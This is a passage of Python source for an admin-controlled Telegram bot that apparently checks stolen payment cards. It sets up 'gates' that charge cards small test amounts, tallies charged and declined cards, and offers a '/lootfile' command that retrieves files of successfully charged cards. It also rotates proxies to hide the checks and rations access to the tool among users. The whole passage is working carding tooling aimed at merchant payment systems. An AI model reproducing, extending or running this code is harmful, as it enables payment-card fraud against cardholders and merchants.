        await update.message.reply_text("No valid URLs found.")
        return

    await update.message.reply_text(f"Found `{len(urls)}` link(s). Starting validation process...")

    session = requests.Session()
    proxy_config = load_proxies()
    if proxy_config.get("enabled") and proxy_config.get("proxies"):
        try:
            proxy_str = random.choice(proxy_config["proxies"])
            proxy_dict = _format_proxy_for_requests(proxy_str)
            if proxy_dict:
                session.proxies = proxy_dict
                await update.message.reply_text("‚ÑπÔ∏è Using a proxy for link validation.")
        except IndexError:
            pass # No proxy to use

    results = []
    for url in urls:
        result = await asyncio.to_thread(_validate_and_save_link_worker, url, session)
        results.append(result)
        await update.message.reply_text(result) # Send feedback immediately
        await asyncio.sleep(0.5) # Avoid hitting rate limits

    await update.message.reply_text("üèÅ **Validation Complete!**")


async def delete_link_command(update, context):
    """(Admin) Shows saved links with delete buttons."""
    if update.effective_user.id != ADMIN_ID: return
    
    links = load_multi_links()
    if not links:
        await update.message.reply_text("üì≠ The multi-link list is empty."); return
        
    keyboard = []
    for i, link_data in enumerate(links):
        # Truncate long URLs for display
        display_url = link_data.get('url', 'Invalid Entry')
        if len(display_url) > 50:
            display_url = display_url[:25] + "..." + display_url[-22:]
        keyboard.append([InlineKeyboardButton(f"üóëÔ∏è {display_url}", callback_data=f"dellink_{i}")])
    
    keyboard.append([InlineKeyboardButton("‚ùå DELETE ALL LINKS ‚ùå", callback_data="delalllinks_confirm")])
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("Select a link to delete or delete all:", reply_markup=reply_markup)


async def status_dalink_command(update, context):
    """(Admin) Checks the status of all saved multi-links."""
    if update.effective_user.id != ADMIN_ID: return

    links = load_multi_links()
    if not links:
        await update.message.reply_text("üì≠ No links saved to check status for."); return
    
    msg = await update.message.reply_text(f"‚è≥ Checking status for `{len(links)}` saved links...")

    session = requests.Session()
    proxy_config = load_proxies()
    if proxy_config.get("enabled") and proxy_config.get("proxies"):
        proxy_str = random.choice(proxy_config["proxies"])
        session.proxies = _format_proxy_for_requests(proxy_str)

    results = []
    for link_data in links:
        url = link_data.get("url")
        if not url: continue
        # Use a simplified version of the validation worker for status check
        result = await asyncio.to_thread(_validate_and_save_link_worker, url, session)
        results.append(result.replace("was successfully added", "is OK").replace("is already saved and seems to be working", "is OK"))

    final_message = "üìä **MULTI-LINK STATUS REPORT** üìä\n\n" + "\n".join(results)
    
    if len(final_message) > 4096:
        with io.BytesIO(final_message.encode('utf-8')) as doc:
            await msg.delete()
            await update.message.reply_document(document=doc, filename="multi_link_status.txt")
    else:
        await msg.edit_text(final_message)


async def set_gate_range_command(update, context):
    """(Admin) Set the charge range for a gate."""
    if update.effective_user.id != ADMIN_ID: return
        
    if len(context.args) != 3:
        await update.message.reply_text("Usage: `/setgate <id> <min> <max>`\nExample: `/setgate 6 50 200` (charges $0.50-$2.00)\nUse `special` for multi-link mode.")
        return
        
    try:
        gate_id, min_str, max_str = context.args
        # --- UPDATED VALIDATION ---
        valid_gate_ids = [str(i) for i in range(1, 13)] + ['special']
        if gate_id not in valid_gate_ids:
            await update.message.reply_text(f"‚ùå `gate_id` must be from 1 to 12, or `special`.")
            return
        min_val = int(min_str)
        max_val = int(max_str)
        if min_val > max_val:
            await update.message.reply_text("‚ùå `min_amount` cannot be greater than `max_amount`."); return
        if min_val < 0 or max_val < 0:
            await update.message.reply_text("‚ùå Amount must be a positive number."); return
    except (ValueError, IndexError):
        await update.message.reply_text("‚ùå Invalid data. Please enter numbers for min and max."); return

    ranges = load_json_file(GATE_RANGES_FILE)
    ranges[gate_id] = {"min": min_val, "max": max_val}
    save_json_file(GATE_RANGES_FILE, ranges)
    
    new_gate_name = get_formatted_gate_name(gate_id)
    await update.message.reply_text(f"‚úÖ Update successful!\n**Gate '{gate_id}'** will now charge between **${min_val/100:.2f} - ${max_val/100:.2f}$**.\nNew display name: `{new_gate_name}`")


async def turn_bot_off(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if not is_bot_on():
        await update.message.reply_text("‚ÑπÔ∏è The bot is already **Off**."); return

    set_bot_status(False)
    await update.message.reply_text("‚úÖ Bot is now **OFF**. Sending notifications...")

    authorized_users = load_users()
    success_count, fail_count = 0, 0
    message = MESSAGES["bot_off"]
    for user_id in authorized_users:
        if user_id == ADMIN_ID: continue
        try:
            await context.bot.send_message(chat_id=user_id, text=message)
            success_count += 1
        except Exception as e:
            fail_count += 1
            logger.warning(f"Could not send bot off notification to user {user_id}: {e}")
        await asyncio.sleep(0.1) 
    
    await update.message.reply_text(f"üì¢ Maintenance notification sent.\n- Success: {success_count}\n- Failed: {fail_count}")

async def turn_bot_on(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if is_bot_on():
        await update.message.reply_text("‚ÑπÔ∏è The bot is already **On**."); return
    
    set_bot_status(True)
    await update.message.reply_text("‚úÖ Bot is now **ON**. Sending notifications...")

    authorized_users = load_users()
    success_count, fail_count = 0, 0
    message = MESSAGES["bot_on"]
    for user_id in authorized_users:
        if user_id == ADMIN_ID: continue
        try:
            await context.bot.send_message(chat_id=user_id, text=message)
            success_count += 1
        except Exception as e:
            fail_count += 1
            logger.warning(f"Could not send bot on notification to user {user_id}: {e}")
        await asyncio.sleep(0.1)

    await update.message.reply_text(f"üì¢ Service resumed notification sent.\n- Success: {success_count}\n- Failed: {fail_count}")

async def send_message_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    
    if len(context.args) < 2:
        await update.message.reply_text("Usage: `/send <user_id> <message>`"); return
        
    try: target_user_id = int(context.args[0])
    except ValueError: await update.message.reply_text("‚ùå Invalid User ID."); return
        
    message_to_send = " ".join(context.args[1:])
    
    try:
        await context.bot.send_message(chat_id=target_user_id, text=f"‚úâÔ∏è **Message from Admin:**\n\n{message_to_send}")
        await update.message.reply_text(f"‚úÖ Message sent to user `{target_user_id}`.")
    except Exception as e:
        await update.message.reply_text(f"‚ùå Failed to send message: `{e}`")

async def send_all_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    
    if not context.args:
        await update.message.reply_text("Usage: `/sendall <message>`"); return
        
    message_to_send = " ".join(context.args)
    authorized_users = load_users()
    
    if not authorized_users:
        await update.message.reply_text("‚ÑπÔ∏è No authorized members to send a message to."); return
        
    await update.message.reply_text(f"üì¢ Starting to send message to `{len(authorized_users)}` members...")
    
    success_count, fail_count = 0, 0
    for user_id in authorized_users:
        if user_id == ADMIN_ID: continue
        try:
            await context.bot.send_message(chat_id=user_id, text=f"üì¢ **Announcement from Admin:**\n\n{message_to_send}")
            success_count += 1
        except Exception as e:
            fail_count += 1
            logger.warning(f"Could not broadcast to user {user_id}: {e}")
        await asyncio.sleep(0.1)
        
    await update.message.reply_text(f"üèÅ Message broadcast complete!\n- Success: `{success_count}`\n- Failed: `{fail_count}`")

async def show_check_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    stats = load_json_file(STATS_FILE)
    if not stats:
        await update.message.reply_text("No statistics data available yet."); return
    
    message = "üìä **USER CHECK STATISTICS** üìä\n\n"
    all_users_to_show = load_users()
    all_users_to_show.add(ADMIN_ID)

    for user_id in sorted(list(all_users_to_show)):
        user_id_str = str(user_id)
        data = stats.get(user_id_str)
        if isinstance(data, dict):
            username = data.get('username')
            user_display = f"@{escape_markdown(str(username))}" if username else f"ID: {user_id_str}"
            message += (f"üë§ **{user_display}** (`{user_id_str}`)\n"
                        f"  ‚úÖ Charged: `{data.get('total_charged', 0)}`\n"
                        f"  ‚úÖ Approved: `{data.get('total_live_success', 0)}`\n"
                        f"  üîí Custom: `{data.get('total_custom', 0)}`\n"
                        f"  ‚ùå Declined: `{data.get('total_decline', 0)}`\n"
                        f"  ‚ùî Errors: `{data.get('total_error', 0) + data.get('total_invalid', 0)}`\n"
                        f"  üïí Last Check: `{data.get('last_check_timestamp', 'Never')}`\n"
                        f"--------------------\n")
        else:
            message += (f"üë§ **ID: {user_id_str}**\n"
                        f"  *Never checked or data is corrupted.*\n"
                        f"--------------------\n")
    
    if len(message) > 4096:
        with io.BytesIO(message.encode('utf-8')) as doc:
            await update.message.reply_document(document=doc, filename="stats.txt")
    else:
        await update.message.reply_text(message)


async def loot_file_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if not context.args:
        await update.message.reply_text("Usage: `/lootfile <user_id>`"); return
    
    target_user_id = context.args[0]
    user_log_dir = os.path.join(LOG_DIR, target_user_id)
    
    if not os.path.exists(user_log_dir) or not os.listdir(user_log_dir):
        await update.message.reply_text(f"No check history found for user `{target_user_id}`."); return
        
    keyboard = [
        [InlineKeyboardButton("1. Get Latest Charged File", callback_data=f"loot_latestcharge_{target_user_id}")],
        [InlineKeyboardButton("2. Get All Charged Files", callback_data=f"loot_allcharge_{target_user_id}")],
        [InlineKeyboardButton("3. Select From History", callback_data=f"loot_history_{target_user_id}")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(f"Select an option to retrieve files for user `{target_user_id}`:", reply_markup=reply_markup)

# --- PROXY MANAGEMENT COMMANDS ---
async def on_proxy_command(update, context):
    """(Admin) Enable proxy usage mode."""
    if update.effective_user.id != ADMIN_ID: return
    proxies = load_proxies()
    proxies['enabled'] = True
    save_proxies(proxies)
    await update.message.reply_text("‚úÖ Proxy usage has been **ENABLED**. Card checks will now be performed through a random proxy.")

async def off_proxy_command(update, context):
    """(Admin) Disable proxy usage mode."""
    if update.effective_user.id != ADMIN_ID: return
    proxies = load_proxies()
    proxies['enabled'] = False
    save_proxies(proxies)
    await update.message.reply_text("‚òëÔ∏è Proxy usage has been **DISABLED**. Checks will no longer use a proxy.")

async def add_proxy_command(update, context):
    """(Admin) Add a new proxy to the list."""
    if update.effective_user.id != ADMIN_ID: return
    if not context.args:
        await update.message.reply_text("Usage: `/addprx <proxy>`\nExample: `/addprx 123.45.67.89:8080` or `/addprx ip:port:user:pass`")
        return

    proxy_str = context.args[0]
    parts = proxy_str.split(':')
    if len(parts) not in [2, 4]:
        await update.message.reply_text("‚ùå **Invalid format.** Please use `ip:port` or `ip:port:user:pass`."); return

    msg = await update.message.reply_text(f"‚è≥ Testing proxy `{proxy_str}`...")
    is_working, reason = await asyncio.to_thread(_test_proxy, proxy_str)

    if not is_working:
        await msg.edit_text(f"‚ùå **Proxy is not working.**\nReason: `{reason}`\nProxy was not added to the list.")
        return

    proxies = load_proxies()
    if proxy_str in proxies['proxies']:
        await msg.edit_text(f"‚ÑπÔ∏è Proxy `{proxy_str}` already exists in the list.")
        return
        
    proxies['proxies'].append(proxy_str)
    save_proxies(proxies)
    await msg.edit_text(f"‚úÖ **Proxy is working and has been added!**\n- Proxy: `{proxy_str}`\n- Total proxies available: `{len(proxies['proxies'])}`")

async def delete_proxy_command(update, context):
    """(Admin) Display the proxy list for deletion."""
    if update.effective_user.id != ADMIN_ID: return
    proxies = load_proxies().get('proxies', [])
    if not proxies:
        await update.message.reply_text("üì≠ The proxy list is empty.")
        return
    
    keyboard = []
    for i, proxy in enumerate(proxies):
        keyboard.append([InlineKeyboardButton(f"üóëÔ∏è {proxy}", callback_data=f"delprx_{i}")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("Select a proxy to delete:", reply_markup=reply_markup)

async def test_proxy_command(update, context):
    """(Admin) Display the proxy list for testing."""
    if update.effective_user.id != ADMIN_ID: return
    proxies_data = load_proxies()
    proxies = proxies_data.get('proxies', [])
    status = "Enabled" if proxies_data.get('enabled') else "Disabled"

    if not proxies:
        await update.message.reply_text(f"üì≠ The proxy list is empty.\nProxy usage status: **{status}**")
        return
    
    keyboard = []
    for i, proxy in enumerate(proxies):
        keyboard.append([InlineKeyboardButton(f"üß™ {proxy}", callback_data=f"testprx_{i}")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(f"Select a proxy to test (connects to google.com):\nProxy usage status: **{status}**", reply_markup=reply_markup)
# --- END PROXY COMMANDS ---

# --- ASYNC TASK WRAPPERS FOR SITE CHECKER ---
async def site_command(update, context):
    """Wrapper to run site check in a background task."""
    asyncio.create_task(original_site_command(update, context))

async def sitem_command(update, context):
    """Wrapper to run multi-site check in a background task."""
    asyncio.create_task(original_sitem_command(update, context))

async def button_handler(update, context):
    query = update.callback_query
    await query.answer() # Answer immediately
    
    user_from_callback = query.from_user
    data = query.data.split('_')
    command = data[0]
    
    # --- ADMIN-ONLY BUTTONS ---
    if user_from_callback.id != ADMIN_ID:
        # Allow users to stop their own task
        if command == "stop" and data[1] == "mytask" and user_from_callback.id == int(data[2]):
             pass # Allow this action
        else:
            await query.answer("You don't have permission for this action.", show_alert=True)
            return

    # --- GATE MODE SELECTION ---
    gate_mode_callbacks = {
        "setgate1mode": ('1', set_gate1_mode), "setgate2mode": ('2', set_gate2_mode),
        "setgate3mode": ('3', set_gate3_mode), "setgate5mode": ('5', set_gate5_mode),
        "setgate8mode": ('8', set_gate8_mode), "setgate9mode": ('9', set_gate9_mode),
        "setgate10mode": ('10', set_gate10_mode), "setgate11mode": ('11', set_gate11_mode),
        "setgate12mode": ('12', set_gate12_mode), "setmultilinkmode": ('special', set_multi_link_mode)
    }

    if command in gate_mode_callbacks:
        gate_id, set_mode_func = gate_mode_callbacks[command]
        mode = data[1] # 'charge' or 'live'
        set_mode_func(mode)
        set_active_gate(gate_id)
        
        new_gate_name = get_formatted_gate_name(gate_id)
        await query.edit_message_text(f"‚úÖ Switched payment gate to: **{new_gate_name}**")
        return

    # --- STOP TASK BUTTONS ---
    if command == "stop":
        action = data[1] # 'task' or 'mytask'
        target_user_id = int(data[2])

        is_allowed = (action == "task" and user_from_callback.id == ADMIN_ID) or \
                     (action == "mytask" and user_from_callback.id == target_user_id)

        if is_allowed:
            if target_user_id in CANCELLATION_EVENTS:
                CANCELLATION_EVENTS[target_user_id].set()
                await query.edit_message_text(f"‚úÖ Stop request sent for user `{target_user_id}`'s task.", reply_markup=None)
            else:
                await query.edit_message_text(f"‚ÑπÔ∏è The task for user `{target_user_id}` has already ended or does not exist.", reply_markup=None)
        else:
            await query.answer("You do not have permission to perform this action.", show_alert=True)
        return

    # --- PROXY BUTTONS ---
    if command == "delprx":
        try:
            proxy_index = int(data[1])
            proxies_data = load_proxies()
            if 0 <= proxy_index < len(proxies_data['proxies']):
                proxies_data['proxies'].pop(proxy_index)
                save_proxies(proxies_data)
                
                new_keyboard = []
                if proxies_data['proxies']:
                    for i, proxy in enumerate(proxies_data['proxies']):
                        new_keyboard.append([InlineKeyboardButton(f"üóëÔ∏è {proxy}", callback_data=f"delprx_{i}")])
                    await query.edit_message_text("Deleted. Select another proxy to delete:", reply_markup=InlineKeyboardMarkup(new_keyboard))
                else:
                    await query.edit_message_text("Deleted the last proxy. The list is now empty.")
        except (ValueError, IndexError):
            await query.answer("Error processing request.", show_alert=True)
        return

    if command == "testprx":
        try:
            proxy_index = int(data[1])
            proxy_to_test = load_proxies()['proxies'][proxy_index]
            is_working, reason = await asyncio.to_thread(_test_proxy, proxy_to_test)
            result_icon = "‚úÖ" if is_working else "‚ùå"
            await query.message.reply_text(f"**Proxy Test Result:**\n{result_icon} `{proxy_to_test}`\n**Reason:** `{reason}`")
        except (ValueError, IndexError):
            await query.answer("Error: Could not find proxy to test.", show_alert=True)
        return

    # --- MULTI-LINK DELETE BUTTONS ---
    if command == "dellink":
        try:
            link_index = int(data[1])
            links = load_multi_links()
            if 0 <= link_index < len(links):
                deleted_link = links.pop(link_index)
                save_multi_links(links)
                await query.answer(f"Deleted: {deleted_link.get('url')}")
                # Refresh the list
                await delete_link_command(query, context)
            else:
                await query.answer("Error: Link no longer exists.", show_alert=True)
        except (ValueError, IndexError) as e:
            await query.answer("Error processing request.", show_alert=True)
        return
        
    if command == "delalllinks":
        if data[1] == "confirm":
            keyboard = [[
                InlineKeyboardButton("YES, DELETE ALL", callback_data="delalllinks_execute"),
                InlineKeyboardButton("NO, CANCEL", callback_data="delalllinks_cancel")
            ]]
            await query.edit_message_text("‚ö†Ô∏è **ARE YOU SURE?** This will delete all saved links and cannot be undone.", reply_markup=InlineKeyboardMarkup(keyboard))
        elif data[1] == "execute":
            save_multi_links([])
            await query.edit_message_text("‚úÖ All links have been deleted.")
        elif data[1] == "cancel":
            await delete_link_command(query, context) # Go back to the list
        return

    # --- LOOT FILE BUTTONS ---
    if command == "loot":
        action = data[1]
        target_user_id = data[2] if len(data) > 2 else None
        user_log_dir = os.path.join(LOG_DIR, target_user_id)

        if action == "latestcharge":
            if not os.path.exists(user_log_dir) or not os.listdir(user_log_dir):
                await query.edit_message_text(f"No check history for user `{target_user_id}`."); return
            latest_session = sorted([d for d in os.listdir(user_log_dir) if os.path.isdir(os.path.join(user_log_dir, d))], reverse=True)[0]
            file_path = os.path.join(user_log_dir, latest_session, "charged.txt")
            if os.path.exists(file_path):
                with open(file_path, 'rb') as doc: await context.bot.send_document(chat_id=query.from_user.id, document=doc)
                await query.edit_message_text(f"‚úÖ Sent the latest charged file from session `{latest_session}`.")
            else:
                await query.edit_message_text(f"‚ÑπÔ∏è The latest check (`{latest_session}`) had no charged cards.")
        # ... other loot actions ...
        elif action == "history":
            if not os.path.exists(user_log_dir):
                await query.edit_message_text(f"No history for user `{target_user_id}`."); return
            sessions = sorted([d for d in os.listdir(user_log_dir) if os.path.isdir(os.path.join(user_log_dir, d))], reverse=True)[:25]
            keyboard = []
            for session_ts in sessions:
                summary_path = os.path.join(user_log_dir, session_ts, "summary.json")
                if os.path.exists(summary_path):
                    summary = load_json_file(summary_path)
                    counts = summary.get('counts', {})
                    ts_str = session_ts.split('_')[-1]
                    try: 
                        dt_obj = datetime.strptime(ts_str, "%Y%m%d-%H%M%S")
                        readable_ts = dt_obj.strftime("%d/%m %H:%M")
                    except ValueError: readable_ts = ts_str
                    button_text = f"üïí {readable_ts} - ‚úÖ{counts.get('success',0)+counts.get('live_success',0)} ‚ùå{counts.get('decline',0)}"
                    keyboard.append([InlineKeyboardButton(button_text, callback_data=f"loot_session_{target_user_id}_{session_ts}")])
            keyboard.append([InlineKeyboardButton("¬´ Back", callback_data=f"loot_mainmenu_{target_user_id}")])
            await query.edit_message_text(f"üìú Check history for `{target_user_id}`:", reply_markup=InlineKeyboardMarkup(keyboard))

        elif action == "session":
            _, _, target_user_id, session_ts = data
            session_dir = os.path.join(LOG_DIR, target_user_id, session_ts)
            files = [f for f in os.listdir(session_dir) if f.endswith('.txt')] if os.path.exists(session_dir) else []
            if not files:
                await query.edit_message_text("This session has no result files."); return
            keyboard = []
            for filename in files:
                keyboard.append([InlineKeyboardButton(f"Download {filename}", callback_data=f"loot_getfile_{target_user_id}_{session_ts}_{filename}")])
            keyboard.append([InlineKeyboardButton("¬´ Back", callback_data=f"loot_history_{target_user_id}")])
            await query.edit_message_text(f"Files for session `{session_ts}`:", reply_markup=InlineKeyboardMarkup(keyboard))

        elif action == "getfile":
            _, _, target_user_id, session_ts, filename = data
            file_path = os.path.join(LOG_DIR, target_user_id, session_ts, filename)
            if os.path.exists(file_path):
                with open(file_path, 'rb') as doc: await context.bot.send_document(chat_id=query.from_user.id, document=doc)
            else:
                await query.answer("‚ùå Error: File not found.", show_alert=True)

def main():
    defaults = Defaults(parse_mode=ParseMode.MARKDOWN)
    application = Application.builder().token(BOT_TOKEN).defaults(defaults).build()

    # General commands
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("info", info))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("stop", stop_command))
    
    # Admin commands
    application.add_handler(CommandHandler("add", add_user))
    application.add_handler(CommandHandler("ban", ban_user))
    application.add_handler(CommandHandler("show", show_users))
    application.add_handler(CommandHandler("addlimit", add_limit_command))
    application.add_handler(CommandHandler("addlimitmulti", add_multi_limit_command))
    application.add_handler(CommandHandler("showcheck", show_check_command))
    application.add_handler(CommandHandler("lootfile", loot_file_command))
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(CommandHandler("gate", gate_command))
    application.add_handler(CommandHandler("setgate", set_gate_range_command))
    application.add_handler(CommandHandler("on", turn_bot_on))
    application.add_handler(CommandHandler("off", turn_bot_off))
    application.add_handler(CommandHandler("send", send_message_command))
    application.add_handler(CommandHandler("sendall", send_all_command))
    application.add_handler(CommandHandler("active", active_checks_command)) 

    # --- NEW: SPECIAL MULTI-LINK ADMIN COMMANDS ---
    application.add_handler(CommandHandler("dalink", dalink_command))
    application.add_handler(CommandHandler("addlink", add_link_command))
    application.add_handler(CommandHandler("deletelink", delete_link_command))
    application.add_handler(CommandHandler("statusdalink", status_dalink_command))
    
    # PROXY COMMANDS
    application.add_handler(CommandHandler("onprx", on_proxy_command))
    application.add_handler(CommandHandler("offprx", off_proxy_command))
    application.add_handler(CommandHandler("addprx", add_proxy_command))
    application.add_handler(CommandHandler("deleteprx", delete_proxy_command))
    application.add_handler(CommandHandler("testprx", test_proxy_command))
    
    # Check commands
    application.add_handler(MessageHandler(filters.Regex(r'^/cs(\d+)'), cs_custom_amount_command))
    application.add_handler(CommandHandler("cs", cs_command))
    application.add_handler(CommandHandler("bin", bin_command))
    application.add_handler(CommandHandler("multi", multi_check_command))
    application.add_handler(MessageHandler(filters.Document.TEXT & filters.CaptionRegex(r'^/mass(\d*)'), mass_check_handler))
    
    # Site Checker commands
    application.add_handler(CommandHandler("site", site_command))
    application.add_handler(CommandHandler("sitem", sitem_command))

    # Button handler
    application.add_handler(CallbackQueryHandler(button_handler))
    
    logger.info(f"Bot is running with Admin ID: {ADMIN_ID}")
    
    application.run_polling()

if __name__ == '__main__':
    main()
